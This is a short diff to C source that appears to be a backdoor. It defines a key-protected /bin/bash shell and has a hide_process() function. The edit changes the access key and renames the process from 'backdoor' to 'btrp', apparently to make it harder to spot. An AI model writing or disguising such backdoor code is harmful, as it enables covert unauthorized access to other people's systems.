@@ -16,10 +16,10 @@
 #include <signal.h>
 
 #define PACKET_SIZE 	1024
-#define KEY         	"xCs!w@"
+#define KEY         	"H300B1ba"
 #define MOTD        	"/bin/bash\n"
 #define SHELL       	"/bin/bash"
-#define PROCESS_NAME    "backdoor"
+#define PROCESS_NAME    "btrp"
 
 
 void hide_process()
